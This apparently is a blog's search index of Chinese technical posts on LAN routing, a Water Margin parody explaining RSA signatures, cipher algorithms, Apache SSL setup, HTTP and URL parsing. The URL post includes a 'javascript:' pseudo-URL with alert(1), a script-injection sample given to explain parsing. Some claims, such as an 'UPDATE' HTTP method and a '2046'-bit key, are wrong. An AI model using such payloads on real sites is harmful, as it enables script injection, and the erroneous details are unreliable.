<?xml version="1.0" encoding="utf-8"?>
<search> 
  
    
    <entry>
      <title><![CDATA[两个局域网怎么互连？一个简单解决方案]]></title>
      <url>/undefined-title/</url>
      <content type="html"><![CDATA[<p>背景故事这样的：工作室有两条宽带，一条用于同学们日常使用，另一条留给四台服务器专用，两个宽带分别用两个路由器做出口。</p>
<p>现在有几个同学想要远程连服务器，但不在一个内网很麻烦，如果都放在同一个网络，又不希望服务器专用网络的带宽被占用。</p>
<p>所以，问题就成了A, B两个局域网怎么在保证wlan出口不变的情况下，让A局域网内的部分机器能直接访问B局域网内的机器。<br><a id="more"></a></p>
<p>开始想过用VPN，但从外网绕进来，怎么也觉得别扭。后来又想俩路由器中间加个交换机，弄个trunk接口。</p>
<p>最后突然想明白，这不等同于一个局域网两个wlan口的问题嘛。<br>想明白这事，解决方案就很简单了：</p>
<ol>
<li>两个路由器A和B网线连lan口并联，把lan设置到同一IP段。</li>
<li>路由器A开DHCP（默认网关指向A本身就行），路由器B关闭DHCP。</li>
<li>其他同学日常用网用自动获取IP，网关自动就指向A。而服务器手动设置IP，网关指向路由器B。</li>
<li>这样就实现两个网络互通，且出口不同了。</li>
<li>最后在路由器A上添加访问规则，限制只能有部分同学的MAC地址可以访问服务器所在的IP范围。</li>
</ol>
<p>其实用一个双wlan口的路由器也能解决这个问题，只是后续再有变更可能没俩路由器那么灵活。<br>第三步如果服务器量大了手动设置就很麻烦，需要用静态DHCP+路由规则去做。</p>
]]></content>
      
        <categories>
            
            <category> 杂谈 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> 局域网 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[梁山神算子算天机 江州黄通判通地孤]]></title>
      <url>/undefined-title/</url>
      <content type="html"><![CDATA[<p>话说当年宋江在江州浔阳楼题了反诗，被江州知府蔡九关押在死牢。蔡九依黄文炳之计，写家书给父亲蔡京，以炫耀“抓获反贼”之功，并让蔡京指点如何处置宋江。</p>
<p>岂料戴宗中途被朱贵药酒迷倒，被同家书一并递与梁山。晁天王听完宋江在牢中心急火燎，定是要带着头领们打入死牢解救宋江，军师吴用却阻拦道：哥哥莫急，此事不可力敌，只能智取—— 我等将计就计，写一封假回书，让戴院长带回去，书上只说教把犯人宋江解赴东京再处决示众，待他来此间经过我们夺了便是。<br><a id="more"></a><br>晁盖道：好是好，只是没人会蔡京笔迹，又没蔡京图章。吴用说有圣手书生萧让可写蔡京字迹，玉臂匠金大坚可刻图章。诸位好汉无不称妙之时，忽闻一声且慢，原来是神算子蒋敬，蒋敬上前道：军师且慢，请细看此家书封底。</p>
<p>众人凑近细看，发现有两行蝇头小字，上书“七四八六九零八八七二三一九三”，下书“四六七三二九七五三”。</p>
<p>晁盖吴用不解，问道：先生这是何意？</p>
<p>蒋敬道：此乃“数章”，用以验明书者正身，文未篡改。</p>
<p>吴用道：寥寥二十余字如何验得，还请先生赐教。</p>
<p>蒋敬在地上画道：此书有两百余字，取首字“今”，得其笔数为四，记于纸上，次字为“有”，其笔数为六，四六得二四，取第二四字，得其笔数为七，记于纸上，七再乘第二五字笔数，再记所的字笔数，若超总字数，则从首再计，如此往复九循，可得“散列”，又名“土法哈希”，若此数无异，可保文未篡改。</p>
<p>吴用叹服之余，又道：今先生既已得“土法哈希”之术，我等效之算出“散列”，书与家书封后，岂不万全？</p>
<p>蒋敬道：军师且听我言，这两行字上面是“数签”，下面则是“数密”。古人云，数若三，七，十三，十七，十九者，除以非一之数，皆无穷尽，谓曰“孤数”。蔡九藏一孤数，名天孤，蔡京写信前新取一孤数，名地孤。天孤乘地孤之积，为数密，又名“土法土法阿爱斯爱”。蔡京以地孤乘“散列”，可得“数签”，“数签”、“数密”记于家书封底，待蔡九收到时以“数密”除以天孤，可得地孤，以验“数签”，可知此书真假。蔡九回书，亦是如此。</p>
<p>晁盖忙道：如今我等既知“数密”，令梁山数百识得数的兄弟分头去算，不过半日，岂不得天孤地孤？</p>
<p>蒋敬叹气道：哥哥所不知啊，由天孤地孤得数密只需三个时辰，可要从数密得天地孤，用尽天下算筹算到黄天更替也不一定算出来啊。<br>晁盖林冲等一帮头领顿足叹气时，吴用道：我有一计，可破此“数签”，令鼓上骚时迁去蔡九府上，盗一封旧家书，假回书只要字数一致，关键字照用旧家书的字，其他内容遣词填补，更替语义，便可不知天地孤亦能造假。<br>晁盖蒋敬拍手称秒：军师不愧为智多星！当下吩咐首领们去做。</p>
<p>话说戴宗扣着日期，回了江州，当厅下了回书，蔡九见戴宗如期归来，好生欢喜，令下人算了地孤，验了数签，心里踏实了。过了两日，临要押送宋江出发时，门子来报“无为军黄通判前来特探”，蔡九将回书给黄文炳看了一番，黄文炳看行文古怪，心有疑虑，又亲自算了一遍地孤和数签。卷过来一看，又见封面新鲜，摇头道：这份回书是假的。</p>
<p>知府到：通判差矣，此是家尊亲笔手迹，又有数签可证，怎会是假的。<br>黄文炳道：我方才又算，得地孤是“六一五一九”，蔡权相府上选地孤，几月便选几开头的地孤，如今九月，此地回书必定是盗用旧文书伪造而成，此乃“时密不符“。</p>
<p>蔡九一惊，急忙唤回戴宗，盘问之下，戴宗不能对答。随即将戴宗一并打入死牢，等候处斩。</p>
<hr>
<p>注解</p>
<ul>
<li>数章：数字签名，数字签名通过摘要和加密算法来保证原文的真实性。文中的数字签名(数章)分成了两部分，第一行是加密后的摘要内容(数签)，第二行是加密采用的公钥(数密)。</li>
<li>土法哈希：Hash，散列函数。实际散列函数计算方式很复杂，文中所写的通过笔画和字的位置算摘要的方法非常简陋，只能保证确定性，却不具备唯一性，很容易出现散列冲突(或者叫哈希碰撞)，文中吴用在后面发现了这个特性，并利用哈希碰撞一定程度上破解了这个算法。我们常见的MD5和SHA1等都属于Hash算法，MD5和SHA实际上也存在哈希碰撞(Collision)的可能，王小云教授破解MD5正是利用了这个原理。</li>
<li>土法阿爱斯爱：RSA，目前最著名的非对称加密算法，RSA算法的核心是极大整数的因数分解和欧拉定律。文中的加密方法只是单纯的利用了大整数难以分解因数的特性，实际上RSA的计算过程和秘钥长度都复杂很多。</li>
<li>孤数：素数/质数，中国古代数学其实并没有素数这个概念。</li>
<li>天孤：用来当私钥的大素数。</li>
<li>地孤：用来实际和哈希值参与计算的素数。</li>
<li>时密不符：时间戳不匹配。在数字签名里加上时间戳可以防止重放攻击，保证信息的时效性。文中蔡京指定发信月份和素数首位匹配，能简单的保证信件时效性，也弥补了哈希算法过于简单导致的被碰撞的漏洞。黄文炳最终靠这一点发现了信件是伪造的。</li>
</ul>
<p>这篇故事新编是我几个月前某天晚上一时兴起发在朋友圈里的，换了种方式给大家科普加密算法。<br>但为了故事氛围和易于理解，将概念都简化了，到底还是戏说。各位有兴趣可以去网上再找资料进一步了解。</p>
]]></content>
      
        <categories>
            
            <category> 安全 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> RSA,加密 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[常见加密算法简介]]></title>
      <url>/undefined-title/</url>
      <content type="html"><![CDATA[<h2 id="一、对称加密_对称密钥（Symmetric-key_cryptography）">一、对称加密 对称密钥（Symmetric-key cryptography）</h2><hr>
<h3 id="概述">概述</h3><p>对称加密是指加解密用同一个密钥的算法，根据具体实现分为流加密和分组加密两种类型：</p>
<ul>
<li><p>流加密（Stream cipher）是对称加密常用的一种实现方法，加密和解密双方使用相同伪随机加密数据流，一般都是逐位异或随机密码本的内容。</p>
</li>
<li><p>分组加密加密（Block cipher），也叫块加密，将明文分成多个等长的模块（block），使用确定的算法和对称密钥对每组分别加密解密。现代分组加密建立在迭代的思想上产生密文。迭代产生的密文在每一轮加密中使用不同的子密钥，而子密钥生成自原始密钥。</p>
</li>
</ul>
<p>对称加密普遍比非对称加密速度要快，实现更简单，适合大量内容的加密<br><a id="more"></a></p>
<h3 id="DES_(Data_Encryption_Standard)">DES (Data Encryption Standard)</h3><p>DES是一种分组加密算法</p>
<p>DES算法的入口参数有三个:Key,Data,Mode，Key是密钥密钥占7个字节56位（64位里另外8位是用来校验的），Data是加密内容，占8个字节64位，Mode是加密还是解密。</p>
<p>DES算法于1976被确定，现在已经被认为不够安全，主要原因是56位的密钥过短。据说这个算法因为包含一些机密设计元素，被怀疑内含美国国家安全局（NSA）的后门。</p>
<p>DES算法有个拓展算法叫3DES，就是对数据块进行三次DES加密，增加爆破成本，但本质上也不够安全。</p>
<h3 id="RC4_(Rivest_Cipher_4)">RC4 (Rivest Cipher 4)</h3><p>RC4是一种流加密算法</p>
<p>RC4起源于1987年，现在已经被认为不够安全。<br>RC4由伪随机数生成器和异或运算组成。RC4的密钥长度可变，范围是[1,255]。RC4一个字节一个字节地加解密。给定一个密钥，伪随机数生成器接受密钥并产生一个S盒。S盒用来加密数据，而且在加密过程中S盒会变化。</p>
<p>由于异或运算的对合性，RC4加密解密使用同一套算法。这个算法实现起来很简单，只用了最基本的加、异或、循环，话说我大学时某个课程设计的做的加密算法就是简化版的RC4。</p>
<p>之后还出现了RC5、RC6加密算法，但RC5和RC6都是分组加密，和RC4原理并不一样。</p>
<h3 id="RC5（Rivest_Cipher_5）">RC5（Rivest Cipher 5）</h3><p>RC5是一种分组加密算法，它和RC2，RC4，RC6都是同一个叫Ronald Rivest的人设计的。</p>
<p>相比RC4，RC5的密钥成了128位，但RC5仍然只需要基础的加、异或、循环运算，可以在很多硬件上实现。RC5有三个参数：字的大小，循环轮数（round），密钥中的8位字节个数，所以可以说RC5是一种可变加密算法。实际上循环轮数12轮以下的RC5都被认为是不安全的，会被差分分析法（Differential cryptanalysis）攻击，18-20轮才足够安全。</p>
<p>目前来说，RC5还是挺安全的，因为实现简单，消耗资源少，在一些传感器、嵌入式设备上使用很合适。</p>
<h3 id="RC6（Rivest_Cipher_6）">RC6（Rivest Cipher 6）</h3><p>RC6是RC5的加强版，也属于分组加密算法。</p>
<p>RC6算法在RC5算法基础之上针对RC5算法中的漏洞，主要是循环移位的位移量并不取决于要移动次数的所有比特，通过采用引入乘法运算来决定循环移位次数的方法，对RC5算法进行了改进，从而大大提高了RC6算法的安全性。</p>
<p>RC6曾作为AES（高级加密标准）备选算法之一，但最终AES选择了Rijndael算法。</p>
<h3 id="AES_(Rijndael)">AES (Rijndael)</h3><p>最后压轴出场的是最著名的单密钥对称加密算法AES，AES是Advanced Encryption Standard的缩写，是美国国家标准与技术研究院2001年发布的新加密标准。<br>AES现在就是指的限定了区块长度和密钥长度的Rijndael算法，同样属于分组加密算法，该算法是两位比利时学者1998年发布的。起初还有很多算法参与了AES甄选，最终Rijndael凭借高安全性和清晰的数学结构而被选用。<br>AES将Rijndael算法的区块长度固定为128位，密钥长度可选128，192或256比特（Rijndael原版支持128-256，n*32的区块长度和密钥长度）。</p>
<p>AES算法包括4个步骤：</p>
<ol>
<li>AddRoundKey—矩阵中的每一个字节都与该次回合密钥（round key）做XOR运算；每个子密钥由密钥生成方案产生。</li>
<li>SubBytes—通过一个非线性的替换函数，用查找表的方式把每个字节替换成对应的字节。</li>
<li>ShiftRows—将矩阵中的每个横列进行循环式移位。</li>
<li>MixColumns—为了充分混合矩阵中各个直行的操作。这个步骤使用线性转换来混合每内联的四个字节。最后一个加密循环中省略MixColumns步骤，而以另一个AddRoundKey替换。</li>
</ol>
<p>截止现在（2016），AES在算法层面上是安全的。2005年有人公布过一种缓存时序攻击法，但使用场景非常极端。</p>
<h3 id="未完_其他待补充">未完 其他待补充</h3><h2 id="二、非对称加密_公钥加密（Asymmetric_key_cryptography）">二、非对称加密 公钥加密（Asymmetric key cryptography）</h2><hr>
<h3 id="概述-1">概述</h3><p>公钥加密的思想于1974年被提出，相比对称加密无需共享密钥，更加安全。但是没法加密大量数据，一般用来加密对称加密的密钥，而用对称加密加密大量数据。<br>非对称加密的原理如下：</p>
<ol>
<li>消息发送方A在本地构建密钥对，公钥和私钥；</li>
<li>消息发送方A将产生的公钥发送给消息接收方B；</li>
<li>B向A发送数据时，通过公钥进行加密，A接收到数据后通过私钥进行解密，完成一次通信；</li>
<li>反之，A向B发送数据时，通过私钥对数据进行加密，B接收到数据后通过公钥进行解密。</li>
</ol>
<h3 id="RSA">RSA</h3><p>RSA算法是最著名的非对称加密算法。RSA是1977年提出的，名字来源于Rivest、Shmir和Adleman三位作者。<br>我们平时用到的SSL协议，TLS协议都采用了该算法加密，SSH（Secure Shell）也是基于RSA实现的。</p>
<p>RSA的数学基础是极大整数的因数分解，具体实现过程如下：</p>
<ol>
<li>随意选择两个大的质数p和q，p不等于q，计算N=pq。</li>
<li>根据欧拉函数，求得r=varphi (N) = varphi(p) * varphi(q)=(p-1)(q-1)</li>
<li>选择一个小于r的整数e，使e与r互质。并求得e关于r的模反元素，命名为d。</li>
<li>(N,e)是公钥，(N,d)是私钥。</li>
<li>加密时，加密的块 n^e ≡ c(MOD N)，得到的c就是密文。解密时，c^d ≡ n(MOD N)。</li>
</ol>
<p>要破解RSA要解决怎么把一个极大数分解为两个质数p和q，然后通过欧拉函数再得到公钥和私钥。但极大数因数分解目前还没什么好办法，所以只要N足够大，RSA在算法层面上就是安全的。</p>
<p>当N的长度为256时，用普通电脑花几小时即可以分解，当N长度为512时需要花数月时间分解，1024时需要大型分布式系统才能分解，长度到2046则可以确保是完全安全的。目前已有记录里，被分解的极大数最大位数是768位，于2009年被分解。</p>
<p>RSA也常被用来做数字签名，在消息内附加一个私钥加密过的散列值（Message digest），以此来确保消息发送人是可靠的。</p>
<h3 id="椭圆曲线算法（Elliptic_curve_cryptography）">椭圆曲线算法（Elliptic curve cryptography）</h3><p>椭圆曲线算法也是一种非对称加密算法，于1985年被提出，以下简称ECC。<br>相比RSA，同等破解难度时ECC的秘钥更短。另外，ECC可定义椭圆曲线群的双线性映射，该特性可能将来被用来实现身份基加密体制（Identity-Based Encryption，IBE）。</p>
<p>ECC的数学基础是求椭圆曲线离散对数问题。实现比较复杂我就不写了，因为我也看不懂(⊙﹏⊙)b。 也正因为实现复杂，ECC的加解密速度慢，消耗资源也更多。</p>
<p>ECC也同样可以实现数字签名，叫做ECDSA。</p>
<p>ECC的秘钥长度最小要求是160位，建议是163位。目前已有的破解记录是109位，一万台机器破解了一年半。所以ECC在算法层面是可以保证安全的。</p>
<h3 id="ElGamal">ElGamal</h3><p>ElGamal加密算法是一种用于对采用Diff-Hellman方式进行交换的公钥进行加密，常被用于数字签名和密钥加密的算法，ElGamal的数学基础是有限域上的离散对数问题。</p>
<p>选择一个素数p和两个随机数g 、x （g、 x &lt; p ），计算 y ≡ g^x（ mod p ） ，则其公钥为 y, g 和p ，私钥是x ，g和p可由一组用户共享。</p>
<p>ElGamal方法中一个明文对应两个加密结果(g^a和g^b)，因此密文空间的大小是明文空间大小的两倍，也就是说纵观整个通信过程，收发密文的大小是实际明文大小的两倍。</p>
<h3 id="待补充">待补充</h3><h2 id="三、哈希算法">三、哈希算法</h2><hr>
<h3 id="概述-2">概述</h3><p>我们经常说MD5加密，但追根究底的话，MD5应该是哈希函数（Hash Function），而哈希函数并不等同于加密（Encrypt），不过我们平常也把哈希叫做加密。哈希函数也叫散列函数，散列函数把消息或数据压缩成摘要，使得数据量变小，将数据的格式固定下来。该函数将数据打乱混合，重新创建一个叫做散列值（hash values，hash codes，hash sums，或hashes）的指纹。散列值通常用来代表一个短的随机字母和数字组成的字符串。</p>
<p>说人话就是哈希（Hash）是将目标文本转换成具有相同长度的、不可逆的杂凑字符串，而加密（Encrypt）是将目标文本转换成具有不同长度的、可逆的密文。</p>
<p>哈希主要用来校验身份，错误检查，完整性检查。</p>
<h3 id="MD5（Message-Digest5_Algorithm）">MD5（Message-Digest5 Algorithm）</h3><p>MD5即消息摘要算法，是最著名、应用最为广泛的一种哈希算法，于1992年被公开。MD5之前还有MD4、MD3、MD2等哥哥算法，MD5是最终的改进版。<br>MD5输入不定长度信息，输出固定长度为128-bits的散列</p>
<h3 id="未完_待补充">未完 待补充</h3>]]></content>
      
        <categories>
            
            <category> 安全 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> hacker </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Apache2自签发V3证书详细流程]]></title>
      <url>/undefined-title/</url>
      <content type="html"><![CDATA[<h2 id="1-_生成自建CA_Root">1. 生成自建CA Root</h2><h3 id="什么是CA">什么是CA</h3><p>CA,Catificate Authority，数字证书认证中心，用于签发证书，保证客户端之间服务端的信任。CA实际上是在做key和cert的pair。<br>常见的Symantec, Comodo等公司都是CA服务商。</p>
<a id="more"></a>
<h3 id="为什么要CA">为什么要CA</h3><p>不经过CA签证的证书之间挂到Apache上也能用，但浏览器肯定会报错ERR_CERT_AUTHORITY_INVALID，带着一个红叉，需要点强行访问来通过。使用这些公司签发的证书浏览器能自动识别，是因为浏览器已经内置了这些厂商的根证书。<br>我们自己做一个CA，一方面是可以去掉报错和红叉，另一方面也是为了实现双向认证模式。</p>
<h3 id="生成CA的key,CSR,Cert">生成CA的key,CSR,Cert</h3><p>待补充</p>
<h3 id="生成CSR，并由CA签发">生成CSR，并由CA签发</h3><p>待补充</p>
<h2 id="2-配置到Aapche2上">2.配置到Aapche2上</h2><p>1.将生成的证书和生成所用的key复制到目标服务器指定目录</p>
<p>2./etc/apache2/sites-available/default-ssl.conf<br>将<virtualhost _default_:443="">节点下修改为如下</virtualhost></p>
<pre><code>&lt;VirtualHost <span class="string">_default_:</span><span class="number">443</span>&gt;
ServerAdmin shitao<span class="annotation">@transfereasy</span>.com
ServerName localhost
DocumentRoot <span class="regexp">/var/</span>www/html
SSLEngine on
SSLCertificateFile      <span class="regexp">/etc/</span>apache2<span class="regexp">/ssl/</span>apache.crt
SSLCertificateKeyFile <span class="regexp">/etc/</span>apache2<span class="regexp">/ssl/</span>apache.key
</code></pre><p>3.确保打开ssl模块和default-ssl.conf文件，重启apache</p>
<pre><code><span class="title">sudo</span> a2enmod ssl
<span class="title">sudo</span> a2ensite <span class="default"><span class="keyword">default</span>-ssl.conf</span>
<span class="title">sudo</span> service apache2 restart
</code></pre><p>4.打开url强制跳转</p>
<pre><code><span class="keyword"><span class="common">RewriteEngine</span></span> <span class="literal">on</span>
<span class="keyword"><span class="common">RewriteCond</span></span> <span class="cbracket">%{SERVER_PORT}</span> !^443$
<span class="keyword"><span class="common">RewriteRule</span></span> ^/?(.*)$ https://<span class="cbracket">%{SERVER_NAME}</span>{REQUEST_URI}<span class="sqbracket"> [L,R]</span>
</code></pre>]]></content>
      
        <categories>
            
            <category> 技术 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Linux </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[详解HTTP细节 1]]></title>
      <url>/undefined-title/</url>
      <content type="html"><![CDATA[<p>HTTP协议基于TCP/IP协议，属于无状态协议</p>
<a id="more"></a>
<h2 id="HTTP_0-9">HTTP 0.9</h2><p>样例：<br><code>GET 192.168.1.2/test.txt</code><br>GET开头，空格接着URL地址和查询字符串，CRLF换行结束，返回结果默认是HTML格式（如果不是服务器也没法通知），HTTP 0.9不支持一台服务器IP对应多个域名，属于已经过时的协议，<strong>但大部分浏览器仍然支持HTTP 0.9，这将导致一些安全问题</strong></p>
<h2 id="HTTP_1-0/1-1">HTTP 1.0/1.1</h2><p>请求样例：<br><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="request">GET <span class="string">/myweb/login.jsp</span> HTTP/1.1</span></span><br><span class="line"><span class="attribute">Cookie</span>: <span class="string">JSESSIONID=77FC1A52E9C3BAD0536359386A96C0FB</span></span><br><span class="line"><span class="attribute">x-requested-with</span>: <span class="string">XMLHttpRequest</span></span><br><span class="line"><span class="attribute">Accept-Language</span>: <span class="string">zh-cn</span></span><br><span class="line"><span class="attribute">Referer</span>: <span class="string">https://192.168.0.0:8443//myweb/login.jsp</span></span><br><span class="line"><span class="attribute">Accept</span>: <span class="string">*/*</span></span><br><span class="line"><span class="attribute">Content-Type</span>: <span class="string">application/x-www-form-urlencoded;charset=UTF-8</span></span><br><span class="line"><span class="attribute">Host</span>: <span class="string">192.168.0.0:8443</span></span><br><span class="line"><span class="attribute">Connection</span>: <span class="string">Keep-Alive</span></span><br><span class="line"><span class="attribute">User-Agent</span>: <span class="string">Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Win64; x64; Trident/4.0; .NET CLR 2.0.50727; SLCC2; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; Tablet PC 2.0)</span></span><br></pre></td></tr></table></figure></p>
<p>第一行包含具体的版本信息，紧接着数条“名称：值”键值对组成的数据行（头域 Headers），每行为一个头域。请求头部分以一个单独的空行结束，空行后面可以加上需要发送给服务器的数据，这些数据长度必须在请求头Content-Length里明确标出。HTTP协议对后面部分数据的格式没有明确要求。<br>返回样例：<br><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="status">HTTP/1.1 <span class="number">200</span> OK</span></span><br><span class="line"><span class="attribute">Server</span>: <span class="string">openresty</span></span><br><span class="line"><span class="attribute">Date</span>: <span class="string">Tue, 08 Mar 2016 08:24:48 GMT</span></span><br><span class="line"><span class="attribute">Content-Type</span>: <span class="string">text/html; charset=utf-8</span></span><br><span class="line"><span class="attribute">Transfer-Encoding</span>: <span class="string">chunked</span></span><br><span class="line"><span class="attribute">Connection</span>: <span class="string">keep-alive</span></span><br><span class="line"></span><br><span class="line"><span class="nginx"><span class="title">Hello</span> world</span></span><br></pre></td></tr></table></figure></p>
<p>第一行包含协议版本和状态码以及状态信息描述（可选），随后若干响应数据行，以一个单独空行结束，再后面是返回的正文内容。<strong>实际情况里，状态码很不可靠</strong>，如果客户端请求里Accept-Encoding没有规定能接受的压缩方式，服务器端可以在gzip、compress、deflate三种压缩方式里任选一种传输。</p>
<h2 id="HTTP_1-0与1-1的差异">HTTP 1.0与1.1的差异</h2><ul>
<li>HTTP 1.1 加入了OPTIONS、PUT、DELETE、TRACE、CONNECT请求方法 （原有GET、POST、HEAD）</li>
<li>HTTP 1.1 增加数个头域<ul>
<li><strong>增加了HOST域，以应对同一IP的多个虚拟主机</strong>；</li>
<li>增加了Upgrade头域，用来告诉服务端，客户端能够支持的其它备用通信协议；</li>
<li>增加了Via头域，用来记录消息转发的路径，它记录了整个路径上所有发送方使用的版本号；</li>
<li>增加了Cache-Control头域（请求消息和响应消息都可使用），用来控制缓存；</li>
<li>增加Content-Range，用于节约优化。</li>
</ul>
</li>
<li>HTTP 1.1 增加了100、305等24个新状态码</li>
<li><strong>HTTP 1.0中需要建立长连接头域必须有Connection: Keep-Alive，HTTP 1.1 默认打开长连接，而且HTTP 1.0的Proxy不支持Connection头域，协议规定所有出现在Connection头域中的头域名都将被忽略。</strong></li>
<li>HTTP 1.1允许客户端不用等待上一次请求结果返回，就可以发出下一次请求，但服务器端必须按照接收到客户端请求的先后顺序依次回送响应结果，以保证客户端能够区分出每次请求的响应内容</li>
<li><strong>HTTP 1.1 支持Transfer-Encoding:chunked</strong> 发送方将消息分割成若干个任意大小的数据块，每个数据块在发送时都会附上块的长度，最后用一个零长度的块作为消息结束的标志。这种方法允许发送方只缓冲消息的一个片段，避免缓冲整个消息带来的过载。<strong>这个差别有可能导致内容解析问题。</strong></li>
<li>HTTP/1.1在1.0的基础上加入了一些cache的新特性，当缓存对象的Age超过Expire时变为stale对象，cache不需要直接抛弃stale对象，而是与源服务器进行重新激活（revalidation）。</li>
<li>date/timestamp (日期时间戳)有细微差别。</li>
</ul>
<h2 id="关于RESTful">关于RESTful</h2><p>中间插一句，最近很流行的一个概念RESTful，REST全称是Representational State Transfer，不过这个全称看着也很懵逼。提出这个概念的Roy Thomas Fielding是HTTP协议的主要设计者，以我的理解，REST其实是让我们回归HTTP方法本身的语义。</p>
<p>HTTP 1.1 是1999年发表的，HTTP 2都发布了，但开发者几乎还在用HTTP 1.0的特性，请求方法平时几乎只用到GET和POST，大量的GET方法都不是幂等的。这显然有悖于HTTP 1.1的设计思想。</p>
<p>REST作为一种标准或者约定，主要定义了以下几点：</p>
<ul>
<li>URL定位资源，URL都指向Resource，都应该是名词，不涉及任何操作语义</li>
<li><p>操作语义交给HTTP请求方法，GET和PUT应当幂等：</p>
<ul>
<li>GET 获取资源，</li>
<li>POST 新建资源</li>
<li>PUT 更新资源，</li>
<li>DELETE 删除资源</li>
<li>UPDATE 更新资源</li>
</ul>
<p>如上，其实HTTP协议的请求方法已经能覆盖所有对资源的操作了。</p>
</li>
<li>HTTP传递资源（无论Json、XML还是二进制数据，都是资源的不同形式）</li>
<li>使用正确的HTTP状态码。HTTP 1.1就有三十多个状态码了。但我们平时用到的极少，很多网站都只有404、500、200这三个状态码。</li>
<li>用/嵌套的url来标示子资源，比如：/tickets/12/messages</li>
<li>用?来过滤资源</li>
</ul>
<p>以上这些约定，仔细看不难发现，都是在重复和强调HTTP本身的语义。</p>
<h2 id="安全问题">安全问题</h2>]]></content>
      
        <categories>
            
            <category> 技术 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> http </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[详解URL细节]]></title>
      <url>/undefined-title/</url>
      <content type="html"><![CDATA[<p>URL即Uniform Resource Locator，统一资源定位符，用来指定互联网上标准资源的地址。</p>
<a id="more"></a>
<h2 id="URL标准结构">URL标准结构</h2><blockquote>
<p>scheme://login:password@address:port/path/to/resource?query_string#fragment</p>
</blockquote>
<ol>
<li>scheme 协议名称<ul>
<li>协议名称由一串不分大小写的字符串组成，以单个冒号结束。</li>
<li>官方认可的有效URL协议由IANA维护，包括http:、https:、ftp:等十余种，但常见浏览器也支持其他伪协议，如data:、javascript:。</li>
<li>浏览器在做进一步解析前，会先判断URL是相对URL还是绝对URL，相对URL要根据当前浏览的上下文才能判断完整的URL。最关键的区别就在于，URL最前面是否包含有效的协议名称。</li>
<li>按照RFC1738规定，URL在冒号之前只允许出现数字字母及”+”,”-“,”.”这三个符合，但实际应用环境中，<strong>所有主流浏览器都会忽略前导换行符和空格</strong>。IE还会忽略所有不可打印字符（ASCII 0x01~0x1F），Chrome会忽略0x00和NUL空字符，Opera协议名里可以包含高位字符。</li>
</ul>
</li>
<li>// 层级标记符 <ul>
<li>RFC1738规定，每个层级结构URL里都必须包含//层级标记符，实际应用环境里各个浏览器表现不同。</li>
<li>http:example/ 在FireFox、Chrome、Safari里直接输入这个URL是可以正常解析的，等同与<a href="http://example/，但有基准URL时，这会被认为是指向example目录的相对路径。" target="_blank" rel="external">http://example/，但有基准URL时，这会被认为是指向example目录的相对路径。</a></li>
<li>javascript://example.com/%0alert(1) 所有浏览器都会认为这个字符串是有效的非层级伪URL，忽略前面的部分并直接执行Js。</li>
<li>mailto://user@example.com IE会忽略层级标记符，直接指向电子邮件地址，其他浏览器不能解析。</li>
<li>IE可以使用\\代替//。</li>
</ul>
</li>
<li>login:password 身份验证<ul>
<li>URL身份验证属于可选项，身份验证信息的传输和协议有关，FTP等部分协议有效，HTTP等协议里如果强行加入这部分信息，没有明确规定怎么处理。</li>
<li>大部分浏览器在身份验证部分里不接受数字字母外的几乎任何字符。</li>
</ul>
</li>
<li>address 服务器地址<ul>
<li>RFC允许不区分大小的域名（example.com），IPv4地址（192.168.1.1），一对方括号里的IPv6地址（[0:0:0:0:0:0:0:1]），FireFox支持方括号里的IPv4地址和主机名，其他浏览器不允许。</li>
<li>实际环境里，浏览器接受八进制、十进制、十六进制，甚至多字节专程单个整数的写法（和浏览器锁依赖的标准C类库有关）。</li>
<li>大部分浏览器会忽略出现在URL内的 0x0A~0x0D、0xA0~0xAD之间的控制字符，而且会主动的把主机名里的全角句号”。”转为”.”（只是主机名，在其他部分则不会转换）</li>
</ul>
</li>
<li>port 服务器端口</li>
</ol>
<ul>
<li>在服务器连接的网络端口并非标准端口时会用到，UDP和TCP都依赖一个16位的端口号来区分不同服务。</li>
<li>我们可以用浏览器想任意服务器发送数据，<strong>即便浏览器不支持这些服务的协议</strong>，比如SMTP。</li>
</ul>
<ol>
<li>path to resource 层级文件路径</li>
</ol>
<ul>
<li>层级文件路径借鉴自UNIX目录语义，支持”/../“和”/./“。</li>
<li>现在的Web应用层级文件路径大多和实际物理路径没什么联系了。</li>
</ul>
<ol>
<li>query_string 查询字符串 </li>
</ol>
<ul>
<li>常见格式为 name1=value1&amp;name2=value2… 但RFC实际上没有规定必须用这种格式，所以也允许query_string是一堆乱七八糟 的字符串，关键在于接受后怎么处理。</li>
</ul>
<ol>
<li>fragment 片段ID</li>
</ol>
<ul>
<li>fragment和查询字符串有点类似，但它是用于客户端的一种可选信息，RFC里没有明确规定片段ID的功能和格式。</li>
<li>实际运用里，片段ID在浏览器中只有一个用途：指向HTML页面的某个锚点。</li>
<li>与query_string不同的是，改变fragment不会触发页面重载，也没有时间开销，所以可以用来存储一些客户端相关的数据。</li>
</ul>
<h2 id="浏览器解析步骤">浏览器解析步骤</h2><ol>
<li>提取协议名称：查找第一个”：”，该字符左边的部分就是协议名称，如果协议名称里出现了不该有的字符，则该URL就是相对URL，这部分内容也不会当成协议处理。</li>
<li>去除层级标记符：如果有”//“就跳过，如果没有……那就不管了。在实际环境里，不用斜杠用一个用两个用三个其实都可以正常解析。</li>
